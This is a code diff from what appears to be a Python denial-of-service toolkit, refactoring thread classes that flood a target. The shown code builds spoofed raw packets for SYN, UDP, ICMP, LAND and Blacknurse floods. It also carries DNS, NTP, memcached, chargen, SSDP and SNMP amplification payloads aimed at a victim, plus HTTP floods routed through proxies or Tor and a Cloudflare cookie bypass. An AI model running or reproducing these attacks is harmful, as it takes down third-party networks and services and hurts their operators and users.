+    thd = pack('!HHLLBBHHH' , sp, self.port, 0 , self.ackf, 5, tf, socket.htons(windf) , 0, 0)
     source_address = socket.inet_aton( sip ) 
     dest_address = socket.inet_aton(dip) 
     tcl = len(thd) + leng 
@@ -1701,7 +1784,7 @@ class sflood(threading.Thread):
     tk = checksum(str(psh))
     tcp_header = pack('!HHLLBBH',sp, port, 0, ackf, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',0)
     packet = iph + tcp_header + urd
-    s.sendto(packet, (dip,port))
+    s.sendto(packet, (dip,self.port))
     counter+=1
     if prints==True:
      print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(counter,sip,req,leng))
@@ -1797,20 +1880,25 @@ def synflood(u,p=80,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,wi
 class udpsp(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.maxttl=maxttl
+  self.minttl=minttl
+  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    try:
     msg=''
-    for x in range(random.randint(1*amp,3*amp)):
+    for x in range(random.randint(1*self.amp,3*self.amp)):
      msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
     if len(msg)>1400:
      msg=msg[0:1400]
     sip=getip()
-    packet = IP(ttl=random.randint(minttl,maxttl),src=sip, dst=target)/UDP(sport=random.randint(1024,65500),dport=port)/msg
+    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=sip, dst=self.target)/UDP(sport=random.randint(1024,65500),dport=self.port)/msg
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,port))
+    s.sendto(packet,(self.target,self.port))
     counter+=1
     if prints==True:
      print("[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(counter,sip,len(packet)))
@@ -1865,21 +1953,29 @@ def udpstorm(u,p=80,threads=100,low=64,maxi=64,ampli=1,interval=300,logs=True,re
 class ln(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.maxttl=maxttl
+  self.minttl=minttl
+  self.winds=winds
+  self.paylo=paylo
+  self.tcpf=tcpf
+  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    try:
-    if winds=='null':
+    if self.winds=='null':
      windf=0
-    if winds=="random":
+    if self.winds=="random":
      windf=random.randint(0,65535)
-    if paylo==False:
+    if self.paylo==False:
      urd=''
      req='None'
     else:
-     if tcpf==True:
+     if self.tcpf==True:
       urd=''
       req='TCP'
-      for x in range(random.randint(1*amp,3*amp)):
+      for x in range(random.randint(1*self.amp,3*self.amp)):
        urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
       if len(urd)>1400:
        urd=urd[0:1400]
@@ -1902,7 +1998,7 @@ class ln(threading.Thread):
        kl=random.randint(1,2)
        if kl==1:
         req="GET"
-        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
+        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),self.target)
        else:
         req="POST"
         k=''
@@ -1915,12 +2011,12 @@ class ln(threading.Thread):
         for x in range(0,random.randint(11,31)):
          j+=random.choice(lis)
         par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),target,par)
-    packet = IP(ttl=random.randint(minttl,maxttl),src=target, dst=target)/TCP(window=windf,sport=port,dport=port)/urd
+        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),self.target,par)
+    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=self.target, dst=self.target)/TCP(window=windf,sport=self.port,dport=self.port)/urd
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,port))
+    s.sendto(packet,(self.target,self.port))
     counter+=1
     if prints==True:
      print("[!]Packets: {} | Type: {} | Bytes: {}".format(counter,req,len(urd)))
@@ -1981,11 +2077,14 @@ def land(u,p=80,threads=100,low=64,maxi=64,ampli=15,tcp=False,payloads=False,win
 class dampli(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.query=query
   time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(dnsl)
-    packet= IP(src=target, dst=ip) / UDP(sport=port,dport=53) / DNS(rd=1, qd=DNSQR(qname=random.choice(domainl), qtype=query))
+    packet= IP(src=self.target, dst=ip) / UDP(sport=self.port,dport=53) / DNS(rd=1, qd=DNSQR(qname=random.choice(domainl), qtype=self.query))
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -2051,11 +2150,13 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
 class nampli(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
   time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(ntpl)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=123)/Raw(load='\x17\x00\x02\x2a'+'\x00'*4)
+    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=123)/Raw(load='\x17\x00\x02\x2a'+'\x00'*4)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -2118,11 +2219,13 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
 class memampli(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
   time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(meml)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=11211)/Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
+    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=11211)/Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -2185,11 +2288,13 @@ def memcacheamplif(u,p=80,memlist=[],threads=100,interval=300,logs=True,returnin
 class charampli(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
   time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(chargenl)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=19)/random.choice(lis)
+    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=19)/random.choice(lis)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -2252,11 +2357,13 @@ def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,retur
 class ssampli(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
   time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(ssdpl)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=1900)/Raw(load='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=1900)/Raw(load='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -2319,11 +2426,13 @@ def ssdpamplif(u,p=80,ssdplist=[],threads=100,interval=300,logs=True,returning=F
 class snampli(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
   time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(snmpl)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=161)/Raw(load='\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00')
+    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=161)/Raw(load='\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00')
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -2386,16 +2495,19 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
 class echst(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    data=''
-   for x in range(random.randint(1*amp,3*amp)):
+   for x in range(random.randint(1*self.amp,3*self.amp)):
     data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
    if len(data)>1400:
     data=data[0:1400]
    try:
     ip=random.choice(pingl)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=7)/Raw(load=data)
+    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=7)/Raw(load=data)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -2452,19 +2564,24 @@ def echo_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,retu
 class icmpcl(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.minttl=minttl
+  self.maxttl=maxttl
+  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    data=''
-   for x in range(random.randint(1*amp,3*amp)):
+   for x in range(random.randint(1*self.amp,3*self.amp)):
     data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
    if len(data)>1400:
     data=data[0:1400]
    try:
-    packet=IP(ttl=random.randint(minttl,maxttl),dst=target)/ICMP()/data
+    packet=IP(ttl=random.randint(self.minttl,self.maxttl),dst=self.target)/ICMP()/data
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,port))
+    s.sendto(packet,(self.target,self.port))
     counter+=1
     if prints==True:
      print("[!]Packets sent: {} | Bytes: {}".format(counter,len(data)))
@@ -2519,20 +2636,25 @@ def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,retur
 class icmpst(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.minttl=minttl
+  self.maxttl=maxttl
+  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    data=''
-   for x in range(random.randint(1*amp,3*amp)):
+   for x in range(random.randint(1*self.amp,3*self.amp)):
     data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
    if len(data)>1400:
     data=data[0:1400]
    try:
     sip=getip()
-    packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP()/data
+    packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP()/data
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,port))
+    s.sendto(packet,(self.target,self.port))
     counter+=1
     if prints==True:
      print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(counter,sip,len(data)))
@@ -2587,15 +2709,19 @@ def icmpstorm(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,
 class blnu(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.minttl=minttl
+  self.maxttl=maxttl
   time.sleep(2)
   while (stop!=True):
    try:
     sip=getip()
-    packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP(type=3,code=3)
+    packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP(type=3,code=3)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,port))
+    s.sendto(packet,(self.target,self.port))
     counter+=1
     if prints==True:
      print ("[!]Packets sent: {} | IP: {}".format(counter,sip))
@@ -2652,12 +2778,16 @@ def blacknurse(u,p=80,ampli=15,low=64,maxi=64,threads=100,payloads=False,interva
 class gldn(threading.Thread):
  def run(self):
   global counter 
+  self.target=target
+  self.port=port
+  self.method=method
+  self.timeout=timeout
   time.sleep(2)
   while (stop!=True):
    pa=random.choice(paths)
    try:
-    conn = httplib.HTTPConnection(target, port, timeout=timeout)
-    if method==1:
+    conn = httplib.HTTPConnection(self.target, self.port, timeout=self.timeout)
+    if self.method==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
@@ -2670,9 +2800,9 @@ class gldn(threading.Thread):
      else:
       jo='?' 
      pa+=jo+q+"="+p
-     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': target}
+     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': self.target}
      conn.request("GET", pa,headers=h)
-    elif method==2:
+    elif self.method==2:
       req="POST"
       k=''
       for _ in range(1,random.randint(2,5)):
@@ -2684,9 +2814,9 @@ class gldn(threading.Thread):
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
+      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': self.target}
       conn.request("POST",pa , params, headers)
-    elif method==3:
+    elif self.method==3:
      i=random.randint(1,2)
      if i==1:
       req="GET"
@@ -2701,7 +2831,7 @@ class gldn(threading.Thread):
       else:
        jo='?' 
       pa+=jo+q+"="+p
-      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': target}
+      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': self.target}
       conn.request("GET",pa,headers=h)
      else:
       req="POST"
@@ -2715,7 +2845,7 @@ class gldn(threading.Thread):
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
+      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': self.target}
       conn.request("POST", pa, params, headers)
     if stop==True:
         break
@@ -2769,6 +2899,8 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
 class medu(threading.Thread):
  def run(self): 
   global counter
+  self.target=target
+  self.timeout=timeout
   time.sleep(2)
   try:
    while (stop!=True):
@@ -2777,7 +2909,7 @@ class medu(threading.Thread):
       ip=line.split(':')[0].split('=')[0]
       p=line.split(':')[1].split('=')[0]
       try:
-       conn = httplib.HTTPConnection(ip, int(p),timeout=timeout)
+       conn = httplib.HTTPConnection(ip, int(p),timeout=self.timeout)
        g=random.randint(1,2)
        if g==1:
         pa=random.choice(paths)
@@ -2792,7 +2924,7 @@ class medu(threading.Thread):
         else:
          jo='?' 
          pa+=jo+q+"="+p
-        conn.request("GET", 'http://'+target+pa)
+        conn.request("GET", 'http://'+self.target+pa)
         if stop==True:
          break
         counter+=1
@@ -2810,7 +2942,7 @@ class medu(threading.Thread):
          for x in range(0,random.randint(11,31)):
            j+=random.choice(lis)
          params =k+'='+(j*random.randint(100,300))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-         conn.request("POST", 'http://'+target+random.choice(paths), params, headers)
+         conn.request("POST", 'http://'+self.target+random.choice(paths), params, headers)
          if stop==True:
           break
          counter+=1
@@ -2886,13 +3018,17 @@ def medusa(u,threads=500,httpl=None,maxtime=5,switching=True,maxprox=70,minprox=
 class dose(threading.Thread):
  def run(self):
   global counter 
-  u=target
+  self.target=target
+  u=self.target
+  self.timeout=timeout
+  self.method=method
+  self.tor=tor
   host=u.split('://')[1].split('/')[0]
   time.sleep(2)
   while (stop!=True):
-   u=target
+   u=self.target
    try:
-    if method==1:
+    if self.method==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
@@ -2906,15 +3042,15 @@ class dose(threading.Thread):
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-     if tor==True:
+     if self.tor==True:
        session = requests.session()
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.get(u,headers=h,timeout=timeout)
+       session.get(u,headers=h,timeout=self.timeout)
      else:
-       requests.get(u,headers=h,timeout=timeout)
-    elif method==2:
+       requests.get(u,headers=h,timeout=self.timeout)
+    elif self.method==2:
       req="POST"
       q=''
       for i in range(1,random.randint(2,15)):
@@ -2936,16 +3072,16 @@ class dose(threading.Thread):
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)+str(random.randint(1,10000))
-      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
-      if tor==True:
+      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
+      if self.tor==True:
        session = requests.session()
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.post(u, data={k:j}, headers=h,timeout=timeout)
+       session.post(u, data={k:j}, headers=h,timeout=self.timeout)
       else:
-       requests.post(u, data={k:j}, headers=h,timeout=timeout)
-    elif method==3:
+       requests.post(u, data={k:j}, headers=h,timeout=self.timeout)
+    elif self.method==3:
      i=random.randint(1,2)
      if i==1:
       req="GET"
@@ -2961,14 +3097,14 @@ class dose(threading.Thread):
        jo='?' 
       u+=jo+q+"="+p
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-      if tor==True:
+      if self.tor==True:
        session = requests.session()
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.get(u,headers=h,timeout=timeout)
+       session.get(u,headers=h,timeout=self.timeout)
       else:
-       requests.get(u,headers=h,timeout=timeout)
+       requests.get(u,headers=h,timeout=self.timeout)
      else:
       req="POST"
       q=''
@@ -2992,14 +3128,14 @@ class dose(threading.Thread):
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
-      if tor==True:
+      if self.tor==True:
        session = requests.session()
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.post(u, data={k:j}, headers=h,timeout=timeout)
+       session.post(u, data={k:j}, headers=h,timeout=self.timeout)
       else:
-       requests.post(u, data={k:j}, headers=h,timeout=timeout)
+       requests.post(u, data={k:j}, headers=h,timeout=self.timeout)
     if stop==True:
         break
     counter+=1
@@ -3050,15 +3186,18 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
 class pdose(threading.Thread):
  def run(self):
   global counter 
-  u=target
+  self.target=target
+  u=self.target
+  self.timeout=timeout
+  self.method=method
   host=u.split('://')[1].split('/')[0]
   time.sleep(2)
   while (stop!=True):
    pr="http://"+random.choice(httplist)
    proxy={'http':pr,'https':pr}
-   u=target
+   u=self.target
    try:
-    if method==1:
+    if self.method==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
@@ -3072,8 +3211,8 @@ class pdose(threading.Thread):
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-     requests.get(u,headers=h,proxies=proxy,timeout=timeout)
-    elif method==2:
+     requests.get(u,headers=h,proxies=proxy,timeout=self.timeout)
+    elif self.method==2:
       req="POST"
       k=''
       for _ in range(1,random.randint(2,5)):
@@ -3084,9 +3223,9 @@ class pdose(threading.Thread):
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)+str(random.randint(1,10000))
-      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
-      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=timeout)
-    elif method==3:
+      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
+      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout)
+    elif self.method==3:
      i=random.randint(1,2)
      if i==1:
       req="GET"
@@ -3102,7 +3241,7 @@ class pdose(threading.Thread):
        jo='?' 
       u+=jo+q+"="+p
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-      requests.get(u,headers=h,proxies=proxy,timeout=timeout)
+      requests.get(u,headers=h,proxies=proxy,timeout=self.timeout)
      else:
       req="POST"
       k=''
@@ -3114,8 +3253,8 @@ class pdose(threading.Thread):
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
-      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
-      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=timeout)
+      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
+      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout)
     if stop==True:
         break
     counter+=1
@@ -3169,6 +3308,8 @@ class atcf(threading.Thread):
  def run(self):
   global counter
   global stop
+  self.target=target
+  self.timeout=timeout
   time.sleep(2)
   while (stop!=True):
      u=random.choice(paths)
@@ -3186,7 +3327,7 @@ class atcf(threading.Thread):
      else:
       jo='?' 
      u+=jo+q+"="+s
-     request = urllib2.Request('http://'+target+u)
+     request = urllib2.Request('http://'+self.target+u)
      a=random.choice(ual)
      if coo==True:
       b=a.split(':')[0]
@@ -3203,9 +3344,9 @@ class atcf(threading.Thread):
      request.add_header('Referer', random.choice(referers) +p)
      request.add_header('Keep-Alive', random.randint(100,500))
      request.add_header('Connection', 'keep-alive')
-     request.add_header('Host',target)
+     request.add_header('Host',self.target)
      try:
-      req=urllib2.urlopen(request,timeout=timeout)            
+      req=urllib2.urlopen(request,timeout=self.timeout)            
       counter+=1
       if prints==True:
        print("Requests: {}".format(counter))
@@ -3226,10 +3367,11 @@ class cooi(threading.Thread):
   global ier
   global ual
   x=flag
+  self.target=target
   us=ue[flag]
   try:
    s = cfscrape.create_scraper()
-   c = s.get_cookie_string("http://"+target,user_agent=us)
+   c = s.get_cookie_string("http://"+self.target,user_agent=us)
    c= str(c).split("'")[1].split("'")[0]
    ual.append(us+':'+c)
   except:
